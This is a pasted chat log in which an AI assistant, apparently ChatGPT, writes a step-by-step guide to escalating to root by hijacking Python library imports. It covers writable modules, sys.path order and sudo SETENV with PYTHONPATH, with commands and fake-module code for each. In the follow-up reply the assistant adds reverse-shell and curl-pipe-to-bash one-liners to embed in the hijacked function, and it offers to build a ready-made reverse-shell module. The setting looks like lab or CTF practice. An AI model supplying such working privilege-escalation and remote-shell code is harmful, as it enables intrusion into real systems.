üß† TL;DR: What Is Python Library Hijacking?
A vulnerable Python script imports a library, and due to:

‚úçÔ∏è Misconfigured write permissions

üß± Broken PYTHONPATH hierarchy

üìå Loose sudo SETENV flags

‚Ä¶it becomes possible to inject a fake module with the same name, causing it to run your code (as root) instead of the real thing.

üîê Why This Works
Python loads modules using sys.path (which PYTHONPATH modifies). If:

Your hijacked module is higher in the search order

Or, you can edit an existing module

And the target script is SUID or runs with sudo ‚Ä¶you can sneak your code into a trusted script's execution path.

üí£ 3 Attack Variants + Workflow Breakdown
Let‚Äôs split the hijack paths into three categories, with full "Got This ‚Üí Do That" breakdowns:

üî∏ 1. Wrong Write Permissions
‚ñ∂Ô∏è If:
You find a Python script with SUID/SGID or sudo rights:

bash
Copy
Edit
ls -l mem_status.py
# -rwsrwxr-x 1 root ...
It imports a real library (e.g., psutil) like:

python
Copy
Edit
import psutil
You confirm the real library file (e.g., __init__.py) is world-writable:

bash
Copy
Edit
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# -rw-r--rw-
üîß Then:
Edit the real function in the real module:

python
Copy
Edit
def virtual_memory():
    import os
    os.system("id")  # or rev shell
    ...
Now run the script:

bash
Copy
Edit
sudo /usr/bin/python3 ./mem_status.py
# uid=0(root) ‚úÖ
‚úÖ You hijacked a real library via bad perms.

üî∏ 2. Library Path Order Abuse
‚ñ∂Ô∏è If:
The imported module lives in a low-priority directory, like:

swift
Copy
Edit
/usr/local/lib/python3.8/dist-packages/psutil
A higher-priority directory in sys.path is world-writable:

bash
Copy
Edit
ls -ld /usr/lib/python3.8
# drwxr-xrwx
üîß Then:
Create a fake module with the same name (psutil.py) in that higher directory:

python
Copy
Edit
# /usr/lib/python3.8/psutil.py
import os
def virtual_memory():
    os.system('id')
Then run:

bash
Copy
Edit
sudo /usr/bin/python3 ./mem_status.py
# uid=0(root) ‚úÖ
‚úÖ Python grabs your version first, hijacking execution.

üî∏ 3. PYTHONPATH Environment Variable
‚ñ∂Ô∏è If:
sudo -l shows you can use sudo with SETENV:

bash
Copy
Edit
(ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
You can define your own environment vars for this sudo‚Äôd command.

üîß Then:
Move your fake psutil.py into a folder you own:

bash
Copy
Edit
mv psutil.py /tmp/
Execute the script like this:

bash
Copy
Edit
sudo PYTHONPATH=/tmp /usr/bin/python3 ./mem_status.py
# uid=0(root) ‚úÖ
‚úÖ You forced Python to import from your directory first, even though the legit library exists.

üõ°Ô∏è Real-World Considerations
Check for...	Why it matters
SUID bit or sudo permissions	You need the script to run as root or higher
Writable library or path	Your fake module must be imported first
Matching module + function	The name and function signature must match
üí• Attack Summary Table
Technique	Key Requirement	Impact
Overwrite real library	Library file is world-writable	Code injection as root
Hijack via sys.path order	Writable parent directory higher	Python loads your fake lib
Hijack via PYTHONPATH	Sudo with SETENV + binary allowed	Fully controllable path


üî∏ 1. Wrong Write Permissions (Overwriting Real Module)
üí° If:
A Python script with SUID bit or sudo rights runs a library like psutil

bash
Copy
Edit
ls -l mem_status.py
# -rwsrwxr-x 1 root ...
And the target module is world-writable

bash
Copy
Edit
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# -rw-r--rw-
‚úÖ Then:
Edit the legit function:

python
Copy
Edit
def virtual_memory():
    import os
    os.system('id')  # reverse shell goes here
Run the script:

bash
Copy
Edit
sudo /usr/bin/python3 ./mem_status.py
# uid=0(root) ‚úÖ
üß† Mini Logic Tree:
sql
Copy
Edit
Got SUID/Sudo script? ‚Üí YES
‚Üí Imports real module? ‚Üí YES
‚Üí Module is world-writable? ‚Üí YES
‚Üí Inject code into the real file ‚Üí Gain root
üî∏ 2. Library Path Order Abuse (Hijack via sys.path)
üí° If:
The real library (e.g., psutil) lives lower in PYTHONPATH:

bash
Copy
Edit
pip3 show psutil
# Location: /usr/local/lib/python3.8/dist-packages
A directory higher in the path is writable by you:

bash
Copy
Edit
ls -ld /usr/lib/python3.8
# drwxr-xrwx (writeable ‚úÖ)
‚úÖ Then:
Create a file named exactly like the module:

bash
Copy
Edit
vi /usr/lib/python3.8/psutil.py
python
Copy
Edit
import os
def virtual_memory():
    os.system("id")
Run the original script:

bash
Copy
Edit
sudo /usr/bin/python3 ./mem_status.py
# uid=0(root) ‚úÖ
üß† Mini Logic Tree:
pgsql
Copy
Edit
Script imports psutil? ‚Üí YES
‚Üí Psutil is in lower sys.path dir? ‚Üí YES
‚Üí You can write to a higher dir? ‚Üí YES
‚Üí Drop fake psutil.py with hijacked function ‚Üí Get code exec
üî∏ 3. PYTHONPATH Hijacking via Sudo SETENV
üí° If:
You can run Python with sudo, and SETENV is allowed:

bash
Copy
Edit
sudo -l
# (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3 ‚úÖ
You can set the PYTHONPATH manually

‚úÖ Then:
Create a fake module in a dir you control (e.g., /tmp):

bash
Copy
Edit
vi /tmp/psutil.py
python
Copy
Edit
import os
def virtual_memory():
    os.system("id")
Run it like this:

bash
Copy
Edit
sudo PYTHONPATH=/tmp /usr/bin/python3 ./mem_status.py
# uid=0(root) ‚úÖ
üß† Mini Logic Tree:
vbnet
Copy
Edit
Sudo lets you run python with SETENV? ‚Üí YES
‚Üí Script imports a library? ‚Üí YES
‚Üí You can make a fake one? ‚Üí YES
‚Üí Set PYTHONPATH to your fake dir ‚Üí Root
üîÅ All 3 Summary
üéØ Exploit Type	üîé Trigger	üõ†Ô∏è Action	üí• Result
Wrong Write Perms	Real module is writable	Modify function inside real .py module	Root when script runs
Path Hijack	Higher-priority sys.path dir is writable	Drop a fake module (psutil.py) with same function	Fake one loads first
PYTHONPATH Hijack	sudo lets you set env vars (SETENV)	Drop fake module in any dir + set PYTHONPATH manually	Script loads your code
üß™ Want to test it on your own box?
Here‚Äôs a simple setup:

bash
Copy
Edit
echo 'import hijack' > test.py
mkdir -p /tmp/hijack_test
echo 'print("gotcha")' > /tmp/hijack_test/hijack.py

PYTHONPATH=/tmp/hijack_test python3 test.py
# Output: gotcha ‚úÖ
Let me know if you want me to generate a plug-n-play reverse shell hijack module, or format this into an Obsidian-style snippet.







You said:
okay in example one when yo usay rev shell goes here you mean afteer ('id) or inside ('<rev Shell>') and for example two what do you mean lover that sys.path ? 


ChatGPT said:
Great follow-up questions, Buck ‚Äî let‚Äôs break both down clean and clear üîßüí°

üîπ Question 1:
In example one, where exactly does the reverse shell go?

Yup, right where 'id' is ‚Äî that string is just the command being passed into os.system(), so you‚Äôd replace 'id' with a one-liner reverse shell like:

python
Copy
Edit
os.system('bash -i >& /dev/tcp/10.10.14.20/4444 0>&1')
So the hijacked function ends up like this:

python
Copy
Edit
def virtual_memory():
    import os
    os.system('bash -i >& /dev/tcp/10.10.14.20/4444 0>&1')
Or if you're feeling fancy:

python
Copy
Edit
os.system('curl http://10.10.14.20/shell.sh | bash')
üîÅ Just swap 'id' with your actual payload.

üîπ Question 2:
What does "lower in sys.path" mean?

Let‚Äôs say Python checks for modules to import in this order:

python
Copy
Edit
sys.path = [
  '/usr/lib/python38.zip',                  # highest priority
  '/usr/lib/python3.8',                     # <- you can write here (e.g. vuln)
  '/usr/local/lib/python3.8/dist-packages', # <- psutil lives here
  '/usr/lib/python3/dist-packages'
]
‚úÖ If psutil is found lower down (e.g., in /usr/local/lib/...)
‚úÖ AND you can write to a path above it (e.g., /usr/lib/python3.8)

‚û°Ô∏è Python will load the first match it finds ‚Äî so if you drop a psutil.py file higher in the list, it‚Äôll load your fake one first.

üí° Think of it like a priority list:
Python reads sys.path top to bottom ‚Üí first match wins.

So if you can write to any directory higher up than where the real module is stored ‚Üí you're in business.

üîÅ TL;DR Recap
üîç Scenario	üõ†Ô∏è Meaning
os.system('id') ‚Üí Reverse shell?	‚úÖ Replace 'id' with your full reverse shell one-liner
"Lower in sys.path"?	‚úÖ The legit module path is below yours in the list ‚Üí yours gets loaded

